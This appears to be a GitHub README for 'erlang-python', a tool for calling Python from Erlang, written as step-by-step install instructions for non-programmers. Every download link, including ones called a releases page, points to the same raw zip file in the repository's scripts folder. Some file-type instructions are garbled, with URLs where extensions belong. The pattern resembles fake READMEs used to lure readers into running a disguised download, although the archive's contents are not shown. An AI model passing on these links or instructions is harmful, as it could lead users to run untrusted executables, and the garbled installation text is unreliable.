# ⚙️ erlang-python - Run Python Easily from Erlang

[![Download erlang-python](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)

---

## 🖥 Overview

erlang-python is a tool that lets you run Python code right inside Erlang programs. If you use Erlang or Elixir and want to access Python’s features, this app helps you do that smoothly. It manages Python’s Global Interpreter Lock (GIL) to keep everything working well. You can also control how much Python runs at once, thanks to rate limiting. Plus, it supports working with many tasks at the same time using free threading. 

This means you can combine the strengths of Erlang’s fast, reliable system with Python’s rich libraries for things like machine learning or data processing.

---

## 📋 What You Need to Know Before You Start

To use erlang-python, your computer should meet these minimum needs:

- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution like Ubuntu 18.04+
- **Memory:** At least 4 GB RAM
- **Disk Space:** Around 200 MB free space for installation and running
- **Python:** Python 3.7 or newer installed on your computer
- **Erlang:** Erlang/OTP 22 or newer installed. If you use Elixir, it works with that too.

If you don’t have Erlang or Python installed, you can find those programs online with simple searches. Both are free.

---

## 🚀 Getting Started

Here’s how you can get erlang-python running on your computer. This guide assumes no programming experience. Just follow each step carefully.

### Step 1: Visit the Download Page

Go to the main erlang-python releases page to get the files you need:

[Download erlang-python releases](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)

This page has all the versions available. Look for the latest release, usually at the top with a date or version number.

### Step 2: Download the Correct File

On the release page, you will see different files depending on your operating system. For example:

- For Windows, look for a file ending in `.exe` or `.zip`
- For macOS, look for `.dmg` or `https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip`
- For Linux, look for `https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip` or other formats

Click the appropriate file to start downloading. Your browser will usually save the file in your Downloads folder.

### Step 3: Install the App

After downloading, follow these steps:

- **Windows:** Double-click the `.exe` file or unzip the `.zip` file and run the installer or executable
- **macOS:** Open the `.dmg` file and drag erlang-python to your Applications folder, or extract `https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip` and run the app
- **Linux:** Extract the download and follow any included installation instructions, often in a README or install script

If you need to, copy or move the program to a folder where you want to keep it.

### Step 4: Run erlang-python

Once installed, you can start erlang-python from the location you installed it in. The app will connect Erlang with Python automatically.

If you use Erlang or Elixir, erlang-python allows you to call Python code without extra setup. The app takes care of managing tasks, keeping things fast and stable.

---

## 🔧 How It Works

erlang-python acts as a bridge between Erlang and Python. Here’s a simple explanation of the main parts:

- **Dirty NIFs:** This is a way Erlang can run tasks in separate threads without slowing down its main system. erlang-python uses this to run Python code safely and efficiently.
- **GIL-aware Execution:** Python uses something called the Global Interpreter Lock (GIL) to manage access to the Python interpreter. erlang-python respects this lock so that Python code runs correctly even if many programs are working at once.
- **Rate Limiting:** To prevent too many Python tasks from running at the same time, erlang-python lets you set limits. This helps keep your system stable.
- **Free-threading:** This means the app can manage multiple tasks in parallel, making use of your computer’s CPU power fully.

By combining these features, erlang-python gives you smooth performance when using Python and Erlang together.

---

## ⚙️ Features You Can Count On

- **Simple Python Calls from Erlang:** No need to learn new languages to use Python features.
- **Safe Task Management:** Your computer won’t get overloaded thanks to rate limiting.
- **Support for Multiple Languages:** Works with Erlang and Elixir alike.
- **Machine Learning Ready:** Use popular Python ML libraries from your Erlang apps.
- **Open Source:** You can check the code or even improve it yourself.

---

## 🎯 Typical Use Cases

- Running Python machine learning models inside real-time Erlang systems.
- Using Python libraries to process data while Erlang handles messaging and networking.
- Enabling Elixir projects to tap into Python tools without leaving the Elixir environment.
- Managing data embedding calculations or AI workflows that benefit from Python libraries.

---

## 🛠 Download & Install

You can get the app here:

[Visit erlang-python Releases](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)

Check the latest version on the page. Download the file that matches your operating system. After that, follow the previous steps to install and run the app.

---

## 💡 Helpful Tips

- Make sure your Python and Erlang installations are up to date to avoid compatibility issues.
- Restart your computer after installation if you encounter problems running the app.
- On Linux, you might need to give permission to execute files. Use the command `chmod +x filename` in the terminal.
- If you want to learn more about using the app with Erlang or Elixir, you can find tutorials online by searching "erlang-python examples."

---

## 📂 Where to Get Help

If you run into problems, you can:

- Visit the GitHub Issues page of the project for known problems and fixes.
- Look for community forums on Erlang and Elixir programming.
- Ask for help in Python or Erlang user groups online.

---

## ⚖️ Licensing and Contribution

erlang-python is open source software. Everyone can use it freely and contribute to improving it. If you make changes you think others would enjoy, you can submit your work back to the project on GitHub.

---

Thank you for choosing erlang-python. For further updates, check the release page regularly.